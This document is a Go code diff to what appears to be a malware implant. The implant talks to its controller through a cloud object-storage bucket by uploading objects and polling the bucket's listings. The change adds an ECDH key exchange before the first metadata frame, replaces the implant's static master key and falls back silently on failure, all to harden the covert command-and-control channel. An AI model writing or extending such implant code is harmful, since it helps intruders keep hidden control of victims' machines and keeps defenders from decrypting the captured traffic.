@@ -7,6 +7,7 @@ import (
 	"implant/core/app"
 	"implant/core/communication"
 	"implant/core/config"
+	"implant/core/debuglog"
 	"implant/core/encrypt"
 	"implant/core/reconnect"
 	"implant/core/utils"
@@ -77,6 +78,10 @@ func (s *OSSClient) Connect(host string) error {
 	}
 	s.bucket = bucket
 
+	// 会话前 ECDH 交换（必须在生成 MetaInfo 之前：MetaInfo 是首帧，
+	// 先加密再交换的话那份对象仍会被静态密钥解开）。
+	s.kxHandshake()
+
 	// MetaInfo + Uid（与原 oss 客户端一致的派生方式）
 	if len(utils.MetaInfo) == 0 {
 		metaRaw, metaErr := utils.EncryptedMetaInfo()
@@ -116,11 +121,72 @@ func (s *OSSClient) Connect(host string) error {
 }
 
 // list 列举桶对象 key（排序），ListObjects 失败时返回错误以触发重连。
-func (s *OSSClient) list() ([]string, error) {
+func (s *OSSClient) list() ([]string, error) { return s.listMax(3) }
+
+// kxHandshake 会话前密钥交换。
+//
+// OSS 没有请求/响应语义，只有"上传对象 + 列表轮询"，所以交换要多一个来回：
+//  1. 上传 <uid>/client_kx_* （载荷 = WriteInt(kxMsgType) + 32 字节公钥）
+//  2. 服务端处理后在桶里写 <uid>/kxresp_* （载荷 = 32 字节服务端公钥）
+//  3. 客户端轮询取回、派生、替换静态主密钥
+//
+// uid 用 GetMetaInfoClientID()：它算的是 MD5(MetaInfo 明文)，不依赖任何密钥，
+// 所以可以在 MetaInfo 生成之前拿到 —— 否则这里的鸡生蛋问题无解。
+//
+// 失败一律静默回落静态密钥（与"服务端不支持 ECDH"同表现）。
+func (s *OSSClient) kxHandshake() {
+	kx, err := encrypt.NewKeyExchange()
+	if err != nil {
+		return
+	}
+	uid, err := utils.GetMetaInfoClientID()
+	if err != nil || uid == "" {
+		return
+	}
+	name := uid + fmt.Sprintf("/client_kx_%020d", time.Now().UnixNano())
+	if err := s.send(name, utils.BytesCombine(utils.WriteInt(kxMsgType), kx.PublicKey())); err != nil {
+		return
+	}
+	// 服务端轮询桶有 1~5s 退避，客户端再留余量；超时即放弃，不阻塞上线
+	deadline := time.Now().Add(20 * time.Second)
+	for time.Now().Before(deadline) {
+		time.Sleep(500 * time.Millisecond)
+		keys, err := s.listMax(64)
+		if err != nil {
+			return
+		}
+		for _, k := range keys {
+			if !strings.Contains(k, "/kxresp_") {
+				continue
+			}
+			data := s.get(k)
+			s.del(k)
+			if len(data) != encrypt.ECDHPublicKeySize {
+				continue
+			}
+			salt, _ := app.GetListenerKeyConfig("oss")
+			masterKey, derr := kx.DeriveMasterKey(data, salt[:16])
+			if derr != nil {
+				return
+			}
+			if rerr := encrypt.GlobalClientKeyManager.ReplaceMasterKey(masterKey); rerr != nil {
+				return
+			}
+			utils.MetaInfo = nil // 旧 MetaInfo 由静态密钥生成，必须重建
+			debuglog.Printf("🔑 [OSS-KX] 会话前密钥交换完成，已替换静态主密钥\n")
+			return
+		}
+	}
+	debuglog.Printf("⚠️ [OSS-KX] 等待服务端公钥超时，回落静态密钥\n")
+}
+
+// listMax 指定返回键数量上限。
+// Recv 只要 3 个（逐条消费）；KX 握手要更多，否则响应对象可能不在这几个键里。
+func (s *OSSClient) listMax(maxKeys int) ([]string, error) {
 	if s.bucket == nil {
 		return nil, fmt.Errorf("未初始化")
 	}
-	lsRes, err := s.bucket.ListObjects(oss.MaxKeys(3), oss.Prefix(""))
+	lsRes, err := s.bucket.ListObjects(oss.MaxKeys(maxKeys), oss.Prefix(""))
 	if err != nil {
 		return nil, err
 	}
